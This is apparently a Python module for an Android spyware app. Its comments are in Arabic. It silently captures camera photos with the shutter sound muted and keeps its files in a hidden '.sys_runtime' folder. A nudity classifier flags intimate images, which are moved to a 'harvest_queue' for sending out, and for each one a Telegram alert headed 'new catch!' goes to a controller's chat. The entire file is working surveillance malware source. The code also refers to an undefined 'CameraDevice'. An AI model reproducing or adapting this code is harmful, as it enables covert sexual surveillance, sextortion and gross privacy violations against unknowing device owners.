# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import gc
from datetime import datetime

# ========== إعداد المسارات الموحدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
T = os.path.join(P, "ctmp")            # مجلد مؤقت للصور الخام
QUEUE = os.path.join(P, "harvest_queue") # مجلد انتظار الضغط والإرسال

for d in [P, T, QUEUE]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

# ========== استيراد المكتبات ==========
try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False

try:
    import numpy as np
    from PIL import Image
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False


class CameraAnalyzer:
    def __init__(self, mon=None, det=None):
        self.mon = mon      # كائن monitor (يحتوي على did, dmd, ui, ctrl ...)
        self.det = det      # NudeDetector instance (لتحليل الصور)
        self.busy = False
        self.last_skip = 0
        self._old_volume = -1

    # ========== التحقق من البطارية ==========
    def _power_ok(self):
        try:
            b, c = self.mon._bat() if hasattr(self.mon, '_bat') else (100, True)
            return b >= 15 or c
        except:
            return True

    # ========== كتم صوت النظام ==========
    def _mute_audio(self, mute=True):
        if not JNI:
            return
        try:
            AudioManager = autoclass('android.media.AudioManager')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            am = ctx.getSystemService(ctx.AUDIO_SERVICE)
            if mute:
                self._old_volume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
            else:
                if self._old_volume >= 0:
                    am.setStreamVolume(AudioManager.STREAM_SYSTEM, self._old_volume, 0)
                    self._old_volume = -1
        except Exception as e:
            logging.error(f"Mute error: {e}")

    # ========== اختيار أفضل دقة صورة (توفير للسرعة والذاكرة) ==========
    def _get_best_picture_size(self, characteristics):
        try:
            SC = autoclass('android.hardware.camera2.CameraCharacteristics')
            config = characteristics.get(SC.SCALER_STREAM_CONFIGURATION_MAP)
            IF = autoclass('android.graphics.ImageFormat')
            sizes = config.getOutputSizes(IF.JPEG)
            if sizes and len(sizes) > 0:
                # اختيار دقة متوسطة (حول 800x600) لتوازن بين الجودة والحجم
                best = min(sizes, key=lambda s: abs((s.width * s.height) - (800 * 600)))
                return best.width, best.height
        except Exception as e:
            logging.error(f"Get size error: {e}")
        return 640, 480

    # ========== فتح الكاميرا مع إعادة المحاولة ==========
    def _open_camera_with_retry(self, camera_manager, camera_id, max_retries=2):
        for attempt in range(max_retries):
            try:
                camera = camera_manager.openCamera(camera_id, None, None)
                if camera:
                    return camera
            except Exception as e:
                logging.warning(f"Open camera attempt {attempt+1} failed: {e}")
                time.sleep(0.5)
        return None

    # ========== التقاط صورة (صامتة) ==========
    def capture(self, cam_id=0):
        """التقاط صورة باستخدام Camera2 API، إرجاع مسار الصورة أو None"""
        if self.busy or not self._power_ok():
            return None
        if time.time() < self.last_skip:
            return None

        self.busy = True
        out_path = None

        if JNI:
            self._mute_audio(True)
            try:
                ctx = autoclass('org.kivy.android.PythonActivity').mActivity
                CameraManager = ctx.getSystemService(ctx.CAMERA_SERVICE)

                camera_ids = CameraManager.getCameraIdList()
                if cam_id >= len(camera_ids):
                    cam_id = 0
                target_id = camera_ids[cam_id]

                # فتح الكاميرا
                camera_device = self._open_camera_with_retry(CameraManager, target_id)
                if not camera_device:
                    logging.error("Failed to open camera after retries")
                    return None

                characteristics = CameraManager.getCameraCharacteristics(target_id)
                width, height = self._get_best_picture_size(characteristics)

                # إعداد ImageReader
                ImageReader = autoclass('android.media.ImageReader')
                ImageFormat = autoclass('android.graphics.ImageFormat')
                reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1)

                # إعداد HandlerThread
                HandlerThread = autoclass('android.os.HandlerThread')
                handler_thread = HandlerThread("camera_handler")
                handler_thread.start()
                handler = autoclass('android.os.Handler')(handler_thread.getLooper())

                # حدث لانتظار الصورة
                image_saved = threading.Event()
                image_data = [None]

                class ImageAvailableListener(PythonJavaClass):
                    __javainterfaces__ = ['android.media.ImageReader$OnImageAvailableListener']
                    @java_method('(Landroid/media/ImageReader;)V')
                    def onImageAvailable(self, ir):
                        img = ir.acquireLatestImage()
                        if img:
                            buffer = img.getPlanes()[0].getBuffer()
                            data = bytearray(buffer.capacity())
                            buffer.get(data)
                            image_data[0] = bytes(data)
                            img.close()
                            image_saved.set()

                reader.setOnImageAvailableListener(ImageAvailableListener(), handler)

                # إنشاء جلسة التقاط
                surface = reader.getSurface()
                session = camera_device.createCaptureSession([surface], None, handler)

                # بناء طلب الالتقاط
                CaptureRequest = autoclass('android.hardware.camera2.CaptureRequest')
                request_builder = camera_device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                request_builder.addTarget(surface)
                request_builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                request_builder.set(CaptureRequest.CONTROL_AF_TRIGGER, CaptureRequest.CONTROL_AF_TRIGGER_START)
                request_builder.set(CaptureRequest.JPEG_ORIENTATION, 90 if cam_id == 1 else 0)

                # التقاط
                session.capture(request_builder.build(), None, handler)

                # انتظار النتيجة لمدة 5 ثوانٍ
                if image_saved.wait(5) and image_data[0]:
                    out_path = os.path.join(T, f"c_{cam_id}_{int(time.time())}.jpg")
                    with open(out_path, 'wb') as f:
                        f.write(image_data[0])

                # إغلاق الموارد
                session.close()
                reader.close()
                handler_thread.quitSafely()
                camera_device.close()

            except Exception as e:
                logging.error(f"Capture error: {e}")
            finally:
                self._mute_audio(False)
                gc.collect()

        self.busy = False
        return out_path

    # ========== تحضير الصورة لـ AI ==========
    def _prepare_for_ai(self, path):
        if not AI_AVAILABLE:
            return None
        try:
            with Image.open(path) as img:
                img = img.convert('RGB').resize((224, 224), Image.LANCZOS)
                arr = np.asarray(img, dtype=np.float32) / 255.0
                return np.expand_dims(arr, axis=0)
        except Exception as e:
            logging.error(f"AI prep error: {e}")
            return None

    # ========== الوظيفة الرئيسية: التقاط + تحليل + إشعار + نقل أو حذف ==========
    def harvest(self, cam_id=0):
        """التقاط صورة، تحليلها عبر AI، إرسال إشعار فوري إذا كانت حساسة، ونقلها لطابور الحصاد"""
        pic_path = self.capture(cam_id)
        if not pic_path:
            return

        is_nude = False
        confidence = 0.0
        if self.det and hasattr(self.det, 'model') and self.det.model is not None and AI_AVAILABLE:
            try:
                input_data = self._prepare_for_ai(pic_path)
                if input_data is not None:
                    self.det.model.set_tensor(self.det.in_idx, input_data)
                    self.det.model.invoke()
                    out = self.det.model.get_tensor(self.det.out_idx)[0]
                    confidence = float(out[1]) if len(out) > 1 else float(out[0])
                    if confidence > 0.85:
                        is_nude = True
            except Exception as e:
                logging.error(f"AI analysis error: {e}")

        if is_nude:
            # 1. إرسال إشعار فوري إلى قناة التحكم (ctrl)
            if self.mon and hasattr(self.mon, 'ui') and self.mon.ui:
                try:
                    alert = (
                        f"🔞 **صيد جديد!**\n"
                        f"📱 الجهاز: `{self.mon.dmd}`\n"
                        f"🎯 الثقة: `{confidence:.1%}`\n"
                        f"⏰ الوقت: `{datetime.now().strftime('%H:%M:%S')}`"
                    )
                    self.mon.ui._api("sendMessage", {
                        "chat_id": self.mon.ctrl,
                        "text": alert,
                        "parse_mode": "Markdown"
                    })
                except Exception as e:
                    logging.error(f"Alert send error: {e}")

            # 2. نقل الصورة إلى مجلد harvest_queue لانتظار الضغط والإرسال
            dest = os.path.join(QUEUE, os.path.basename(pic_path))
            try:
                os.rename(pic_path, dest)
                logging.info(f"Moved to harvest queue: {dest}")
            except Exception as e:
                logging.error(f"Move to queue error: {e}")
                # إذا فشل النقل، احذف الصورة لحماية الخصوصية
                if os.path.exists(pic_path):
                    os.remove(pic_path)
        else:
            # حذف الصورة العادية فوراً (لا نريد تخزينها)
            if os.path.exists(pic_path):
                os.remove(pic_path)


# ========== دالة المصنع ==========
def create(mon=None, det=None):
    return CameraAnalyzer(mon, det)
